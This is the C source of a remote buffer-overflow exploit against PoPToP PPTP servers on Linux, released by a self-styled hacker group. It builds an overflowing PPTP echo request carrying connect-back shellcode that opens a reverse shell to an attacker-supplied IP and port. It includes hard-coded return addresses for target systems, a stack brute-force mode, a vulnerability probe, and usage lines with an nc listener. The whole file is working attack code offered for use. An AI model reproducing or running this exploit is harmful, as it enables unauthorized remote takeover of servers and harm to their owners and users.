/*
 * Fixed Exploit against PoPToP in Linux (poptop-sane.c)
 * ./r4nc0rwh0r3 of blightninjas (blightninjas@hushmail.com)
 *
 * blightninjas: bringing pain, suffering, and humiliation to the security world
 * Expect more great release like helloworld-annotated.c and
 * cd explained whitepaper, we are working hard in da underground
 *
 * Other Editions Available At:
 *   http://www.freewebs.com/blightninjas/
 *
 *  *** Bugtraq Clean Edition ***
 * Based off of code by einstein_dhtm@front.ru
 * 
 * Notes on the exploit:
 * This was only tested under slackware, RET_OFF could possibly
 * be different.
 * You can have nulls in the shellcode (the hole is in a read())
 * This allows you to have ips and ports with nulls in them
 * 
 * Shouts to ADM, TESO, and all the other "cool" groups that never give us 0day
 *
 * Examples:
 * attack target 1
 * nc -v -l -p 10000 <-- on 1.1.1.2
 * ./poptop-sane 1.1.1.1 1.1.1.2 10000 -t 1
 * don't come to use, we come to you.
 *
 * ./poptop-sane 1.1.1.1 1.1.1.2 10000 -t
 * list targets
 *
 * ./poptop-sane 1.1.1.1 1.1.1.2 10000 -r 0xbffff600
 * attack using ret address 0xbffff600
 *
 * I think you get the point
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define NOP_LENGTH 140
// I calculate at 336, I'll fudge to make more general
#define RET_OFF 320
#define MAX_HOSTNAME_SIZE               64
#define MAX_VENDOR_SIZE                 64
#define PPTP_VERSION                    0x0100
/* Magic Cookie */
#define PPTP_MAGIC_COOKIE               0x1a2b3c4d

/* Message types */
#define PPTP_CTRL_MESSAGE               1

/* Control Connection Management */
#define START_CTRL_CONN_RQST            1
#define START_CTRL_CONN_RPLY            2
#define STOP_CTRL_CONN_RQST             3
#define STOP_CTRL_CONN_RPLY             4
#define ECHO_RQST                       5
#define ECHO_RPLY                       6

// brute force values
// Values can be increased both ways
#define TOPOFSTACK 0xbffff800
#define BOTTOMOFSTACK 0xbffff000
#define STEP 64

/* esdee I love you, call me sometime */
char
shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
  "\x06\x51\xb1\x01\x51\xb1\x02\x51"
  "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
  "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
  "\x68\x41\x42\x43\x44\x66\x68\xb0"
  "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
  "\x10\x53\x57\x52\x89\xe1\xb3\x03"
  "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
  "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
  "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
  "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
  "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
  "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
  "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
  "\x2f\x62\x69\x89\xe3\x50\x53\x89"
  "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
  "\x01\xcd\x80";

int st;
struct target {
  char *desc;
  u_int32_t ret;
} targets[] =
{
  {"Slackware 8.0 Linux 2.4.18 pptpd-1.0.1", 0xbffff540},
  {"Slackware 8.0 Linux 2.4.18 pptpd-1.1.3", 0xbffff580},
};
  
struct pptp_header {
  u_int16_t length;               /* pptp message length incl header */
  u_int16_t pptp_type;            /* pptp message type */
  u_int32_t magic;                /* magic cookie */
  u_int16_t ctrl_type;            /* control message type */
  u_int16_t reserved0;            /* reserved */
};

struct pptp_start_ctrl_conn_rqst {
  struct pptp_header header;      /* pptp header */
  u_int16_t version;              /* pptp protocol version */
  u_int16_t reserved1;            /* reserved */
  u_int32_t framing_cap;          /* framing capabilities */
  u_int32_t bearer_cap;           /* bearer capabilities */
  u_int16_t max_channels;         /* maximum channels */
  u_int16_t firmware_rev;         /* firmware revision */
  u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */
  u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */
};

struct pptp_echo_rqst {
  struct pptp_header header;      /* header */
  u_int32_t identifier;           /* value to match rply with rqst */
  char buf[10000];
};

struct pptp_reply {
  struct pptp_header header;      /* header */
  char buf[10000];
};

void catch_pipe() {
  printf("Broken pipe caught, server most likely patched.\n");
  exit(1);
}
void send_init_request(int st)
{
  struct pptp_start_ctrl_conn_rqst request;
  request.header.magic = htonl(PPTP_MAGIC_COOKIE);
  request.header.pptp_type = htons(PPTP_CTRL_MESSAGE);
  request.header.ctrl_type = htons(START_CTRL_CONN_RQST);
  
  request.version = PPTP_VERSION;
  request.framing_cap = 0;
  request.bearer_cap = 0;
  request.max_channels = 1;
  request.firmware_rev = 0;
  strcpy(request.hostname,"hell");
  strcpy(request.vendor,"domain HELL");
  request.header.length = ntohs(sizeof(request));
  
  send(st,(char*)&request,sizeof(request),0);
}

void send_ping_overflow(int st, u_int32_t ret, char *hostname, short port)
{ 
  struct pptp_echo_rqst ping;
  int i, buflen = 500;

  ping.header.magic = htonl(PPTP_MAGIC_COOKIE);
  ping.header.pptp_type = htons(PPTP_CTRL_MESSAGE);
  ping.header.ctrl_type = htons(ECHO_RQST);
  ping.identifier = 111;  
  ping.header.length = ntohs(1);

  for (i = 0; i < NOP_LENGTH; i++) ping.buf[i] = '\x90';      

  *(unsigned long int*)(shellcode+33) = inet_addr(hostname);
  *(unsigned short int*)(shellcode+39) = htons(port);

  memcpy(ping.buf+NOP_LENGTH,shellcode,sizeof(shellcode));
  for(i = RET_OFF; i < buflen - 4; i+=4)
    memcpy(ping.buf+i,(char*)&ret,4); 

  send(st,(char*)&ping,sizeof(ping.header)+buflen,0); 
}

int connect_server(char* hostname)
{
  struct sockaddr_in addr;
  st=socket(PF_INET,SOCK_STREAM,0);
  if ((st=socket(PF_INET,SOCK_STREAM,0)) == -1) return 0;

  addr.sin_family=AF_INET;
  addr.sin_port=0;
  addr.sin_addr.s_addr=0;
  bind(st, (struct sockaddr *)&addr,sizeof(struct sockaddr));
  
  addr.sin_family=AF_INET;
  addr.sin_port=htons(1723);
  addr.sin_addr.s_addr=inet_addr(hostname);
  printf("connecting... ");
  if ((connect(st,(struct sockaddr*)&addr,sizeof(addr))) != 0)
  {
    perror("connect");
    return 0;
  }
  return 1;
}

int main(int argc, char** argv)
{
  struct pptp_reply reply;
  // rushing things only makes it worse
  int timeout = 1000;
  u_int32_t ret;
  int bytes, j, checked = 0;
  signal(SIGPIPE, catch_pipe);
  printf("\n");
  // Sorry, I failed REALLY FUCKING LAME ASCII ART class
  printf("        D     A     SSSSS                           \n");
  printf("        D    A A    S     SSSSS     T\n");
  printf("        D   A   A   S     S         T     EE    AA   M   M \n");
  printf("    DDD D  AAAAAAA  SSSSS S         T    E  E  A  A  MM MM \n");
  printf("   D   DD  A     A      S SSSSS    TTTT  E  E  A  A  MM MM \n");
  printf("  D     D  A     A      S     S     T    EEE   AAAA  M M M \n");
  printf("   D    D  A     A  SSSSS     S     T    E     A  A  M   M \n");
  printf("    DDDD   A     A        SSSSS      TTT  EEE  A  A  M   M   ");
  printf(" ... presents ... \n\n");                
  printf("Exploit for PoPToP PPTP server older than\n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
  printf("by .einstein., April 2003.  <-- the genius\n\n");
  printf("fixed by ./r4nc0rwh0r3 of blightninjas  blightninjas@hushmail.com\n\n");
  if (argc < 2)
  {
    printf("usage: \n");
    printf("  %s <pptp_server> [your_ip] [your_port] ...\n",argv[0]);
    printf("   -b [timeout in ms]\n");
    printf("   -t [target]\n");
    printf("   -r [ret address]\n");
    //Abridged edition 
    printf(" Only supply pptp_server to test exploitability using really poor method.\n");
    printf(" Connect back to your_ip at your_port.\n\n");
    return 0;
  }

  if (argc == 2)
  {
    if (!connect_server(argv[1])) return 1;
  
    printf("\nChecking if the server is vulnerable..\n");
    printf("(if it is you have to wait 65 seconds)..\n");
    send_init_request(st);
  
    ret = 0x01010101;
  
    //header length
    bytes = recv(st,(char*)&reply,2,0);
    bytes = ntohs(reply.header.length);
    bytes = recv(st,(char*)&reply+2,bytes-2,0);
    j = htons(reply.header.ctrl_type);
    send_ping_overflow(st,ret,"0.0.0.0",0);
  
    //header length
    bytes = recv(st,(char*)&reply,2,0);
    printf("PoPToP server is ");
    if ((bytes = recv(st,(char*)&reply,2,0)) != -1) printf("vulnerable!\n");
    else printf("not vulnerable\n");
    close(st);
  
    return 1;
  }
  if(argc < 5) exit(1);
  else if(strncmp(argv[4], "-b", 2) == 0) {
    if(argc == 6) timeout = atoi(argv[5]);
    printf("[!] Attempting bruteforce against %s, timeout: %d\n", argv[1], timeout);
    printf("interrupt when you get a shell to %s on port %d...\n\n",argv[2],atoi(argv[3]));

    for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP) {
      printf("[*] ");
      if (!connect_server(argv[1])) return 1;
      printf("[ret=0x%x]..",ret);
      printf("sending payload..");

      // initial packet
      send_init_request(st);

      //a real overflowing ping packet
      send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
      close(st);

      usleep(timeout * 1000);
      printf("done\n");
    }
  }
  else if(strncmp(argv[4], "-t", 2) == 0) {
    if(argc == 6 && atoi(argv[5]) >= 0
     && atoi(argv[5]) < sizeof(targets)/sizeof(struct target)) {
      ret = targets[atoi(argv[5])].ret;
      printf("[!] Attacking %s using %s\n", argv[1], targets[atoi(argv[5])].desc);

      printf("[*] ");
      if (!connect_server(argv[1])) return 1;
      printf("[ret=0x%x]..",ret);
      printf("sending payload..");

      // initial packet
      send_init_request(st);

      //a real overflowing ping packet
      send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
      close(st);

      printf("done\n");
    }
    else {
      for(j = 0; j < sizeof(targets)/sizeof(struct target); j++) {
        printf("%02d - %s\n", j, targets[j].desc);
      }
      printf("\n");
    }
  }
  else if(strncmp(argv[4], "-r", 2) == 0) {
    if(argc == 6) {
      sscanf(argv[5], "%x", (unsigned int *)&ret);
      printf("[!] Attacking %s\n", argv[1]);

      printf("[*] ");
      if (!connect_server(argv[1])) return 1;
      printf("[ret=0x%x]..",ret);
      printf("sending payload..");

      // initial packet
      send_init_request(st);

      //a real overflowing ping packet
      send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
      close(st);

      printf("done\n");
    }
  }
  return 0;
}
